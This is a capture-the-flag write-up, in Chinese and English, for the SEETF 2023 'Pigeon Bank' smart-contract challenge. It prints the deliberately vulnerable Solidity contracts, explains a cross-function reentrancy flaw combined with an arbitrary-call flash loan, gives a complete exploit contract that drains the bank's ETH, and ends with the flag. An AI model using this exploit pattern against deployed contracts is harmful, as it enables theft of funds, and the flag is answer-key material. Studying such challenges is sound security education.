---
title: Blockchain - Pigeon Bank
description: 2023 | SEETF | Smart Contracts
tags:
    - smart contract
    - cross-function reentrancy
---

## 题目

The new era is coming. Pigeons are invading and in order to survive, the SEE Team created PigeonBank so that people can get extremely high interest rate. Hold PETH to get high interest. PETH is strictly controlled by the SEE team to prevent manipulation and corruption.

> nc win.the.seetf.sg 8550

??? note "Setup.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.17;

    import "./PETH.sol";
    import "./PigeonBank.sol";

    contract Setup {
        PETH public immutable peth;
        PigeonBank public immutable pigeonBank;

        // @dev - The SEE Team provided 2500 ETH to PigeonBank to provide liquidity so that the bank stays solvent.
        constructor() payable {
            require(msg.value == 2500 ether, "Setup: msg.value must be 2500 ether");
            pigeonBank = new PigeonBank();
            peth = pigeonBank.peth();

            // @dev - Deposit 2500 ETH to PigeonBank
            pigeonBank.deposit{value: msg.value}();

            assert(address(pigeonBank).balance == 0 ether);
            assert(peth.balanceOf(address(this)) == 2500 ether);
        }

        function isSolved() external view returns (bool) {
            return (peth.totalSupply() == 0) && (address(msg.sender).balance >= 2500 ether);
        }
    }
    ```

??? note "PigeonBank.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.17;

    import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
    import "@openzeppelin/contracts/utils/Address.sol";

    import "./PETH.sol";

    // Deposit Ether to PigeonBank to get PETH
    // @TODO: Implement interest rate feature so that users can get interest by depositing Ether
    contract PigeonBank is ReentrancyGuard {
        using Address for address payable;
        using Address for address;

        PETH public immutable peth; // @dev - Created by the SEE team. Pigeon Bank is created to allow citizens to deposit Ether and get SEETH and earn interest to survive the economic crisis.
        address private _owner;

        constructor() {
            peth = new PETH();
            _owner = msg.sender;
        }

        function deposit() public payable nonReentrant {
            peth.deposit{value: msg.value}(msg.sender);
        }

        function withdraw(uint256 wad) public nonReentrant {
            peth.withdraw(msg.sender, wad);
        }

        function withdrawAll() public nonReentrant {
            peth.withdrawAll(msg.sender);
        }

        function flashLoan(address receiver, bytes calldata data, uint256 wad) public nonReentrant {
            peth.flashLoan(receiver, wad, data);
        }

        receive() external payable {}
    }
    ```

??? note "PETH.sol"

    ```js
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.17;

    import "@openzeppelin/contracts/access/Ownable.sol";
    import "@openzeppelin/contracts/utils/Address.sol";

    contract PETH is Ownable {
        using Address for address;
        using Address for address payable;

        string public constant name = "Pigeon ETH";
        string public constant symbol = "PETH";
        uint8 public constant decimals = 18;

        event Approval(address indexed src, address indexed dst, uint256 amt);
        event Transfer(address indexed src, address indexed dst, uint256 amt);
        event Deposit(address indexed dst, uint256 amt);
        event Withdrawal(address indexed src, uint256 amt);

        mapping(address => uint256) public balanceOf;
        mapping(address => mapping(address => uint256)) public allowance;

        receive() external payable {
            revert("PETH: Do not send ETH directly");
        }

        function deposit(address _userAddress) public payable onlyOwner {
            _mint(_userAddress, msg.value);
            emit Deposit(_userAddress, msg.value);
            // return msg.value;
        }

        function withdraw(address _userAddress, uint256 _wad) public onlyOwner {
            payable(_userAddress).sendValue(_wad);
            _burn(_userAddress, _wad);
            // require(success, "SEETH: withdraw failed");
            emit Withdrawal(_userAddress, _wad);
        }

        function withdrawAll(address _userAddress) public onlyOwner {
            payable(_userAddress).sendValue(balanceOf[_userAddress]);
            _burnAll(_userAddress);
            // require(success, "SEETH: withdraw failed");
            emit Withdrawal(_userAddress, balanceOf[_userAddress]);
        }

        function totalSupply() public view returns (uint256) {
            return address(this).balance;
        }

        function approve(address guy, uint256 wad) public returns (bool) {
            allowance[msg.sender][guy] = wad;
            emit Approval(msg.sender, guy, wad);
            return true;
        }

        function transfer(address dst, uint256 wad) public returns (bool) {
            return transferFrom(msg.sender, dst, wad);
        }

        function transferFrom(address src, address dst, uint256 wad) public returns (bool) {
            require(balanceOf[src] >= wad);

            if (src != msg.sender && allowance[src][msg.sender] != type(uint256).max) {
                require(allowance[src][msg.sender] >= wad);
                allowance[src][msg.sender] -= wad;
            }

            balanceOf[src] -= wad;
            balanceOf[dst] += wad;

            emit Transfer(src, dst, wad);

            return true;
        }

        function flashLoan(address _userAddress, uint256 _wad, bytes calldata data) public onlyOwner {
            require(_wad <= address(this).balance, "PETH: wad exceeds balance");
            require(Address.isContract(_userAddress), "PETH: Borrower must be a contract");

            uint256 userBalanceBefore = address(this).balance;

            // @dev Send Ether to borrower (Borrower must implement receive() function)
            Address.functionCallWithValue(_userAddress, data, _wad);

            uint256 userBalanceAfter = address(this).balance;

            require(userBalanceAfter >= userBalanceBefore, "PETH: You did not return my Ether!");

            // @dev if user gave me more Ether, refund it
            if (userBalanceAfter > userBalanceBefore) {
                uint256 refund = userBalanceAfter - userBalanceBefore;
                payable(_userAddress).sendValue(refund);
            }
        }

        // ========== INTERNAL FUNCTION ==========

        function _mint(address dst, uint256 wad) internal {
            balanceOf[dst] += wad;
        }

        function _burn(address src, uint256 wad) internal {
            require(balanceOf[src] >= wad);
            balanceOf[src] -= wad;
        }

        function _burnAll(address _userAddress) internal {
            _burn(_userAddress, balanceOf[_userAddress]);
        }
    }
    ```

## 解题思路

- 初始，`Setup` 合约向 `PETH` deposit 了 2500 ether，目标是清空 `PETH` 内的存款
- 需要通过 `PigeonBank` 调用 `PETH` 的函数，可调用的函数包括 `deposit()`、`withdraw()`、`withdrawAll()` 和 `flashLoan()`
- 首先关注 `flashLoan()`，由于不能直接向 `PETH` 发送 ETH，要么每次借贷金额为 0，要么使用 `selfdestruct` 返还给 `PETH`，但都不具备太大的价值

    ```js
    receive() external payable {
        revert("PETH: Do not send ETH directly");
    }
    ```

    - 不过，`PETH.flashLoan()` 使用了 `Address.functionCallWithValue()`，即可以让 `PETH` 的实例调用任何函数 :D

- 值得注意的是，在 `withdrawAll()` 中，首先向 `_userAddress` 发送其当前余额对应数量的 ETH，随后根据 `_userAddress` 的当前余额销毁代币，那么可以在回调函数中将代币 `transfer` 到受控地址（可以是 `PETH` 实例，使用 `flashLoan()` 调用 `approve`），从而逐步转移 `PETH` 持有的 ETH > <

    ```js
    function withdrawAll(address _userAddress) public onlyOwner {
        payable(_userAddress).sendValue(balanceOf[_userAddress]);
        _burnAll(_userAddress);
        // require(success, "SEETH: withdraw failed");
        emit Withdrawal(_userAddress, balanceOf[_userAddress]);
    }

    function _burn(address src, uint256 wad) internal {
        require(balanceOf[src] >= wad);
        balanceOf[src] -= wad;
    }

    function _burnAll(address _userAddress) internal {
        _burn(_userAddress, balanceOf[_userAddress]);
    }
    ```

### Exploit

```js
pragma solidity 0.8.17;

interface IPigeonBank {
    function peth() external view returns (IPETH);
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function withdrawAll() external;
    function flashLoan(address receiver, bytes calldata data, uint256 wad) external;
}

interface IPETH {
    function approve(address guy, uint256 wad) external returns (bool);
    function transfer(address dst, uint256 wad) external returns (bool);
    function transferFrom(address src, address dst, uint256 wad) external returns (bool);
}

contract Hack {
  IPigeonBank bank;
  IPETH peth;
  bool onWithdraw;

  function exploit(address payable instance) external payable {
    bank = IPigeonBank(instance);
    peth = bank.peth();
    bank.flashLoan(
        address(peth),
        abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        ),
        0
    );
    uint amount;
    while (address(peth).balance != 0) {
        amount = address(this).balance < address(peth).balance ? address(this).balance : address(peth).balance;

        bank.deposit{value: amount}();

        onWithdraw = true;
        bank.withdrawAll();
        onWithdraw = false;

        peth.transferFrom(address(peth), address(this), amount);
        bank.withdrawAll();
    }
    selfdestruct(payable(msg.sender));
  }

  fallback() external payable {
      if (onWithdraw) {
          peth.transfer(address(peth), msg.value);
      }
  }
}
```

### Flag

> SEE{N0t_4n0th3r_r33ntr4ncY_4tt4ck_abb0acf50139ba1e468f363f96bc5a24}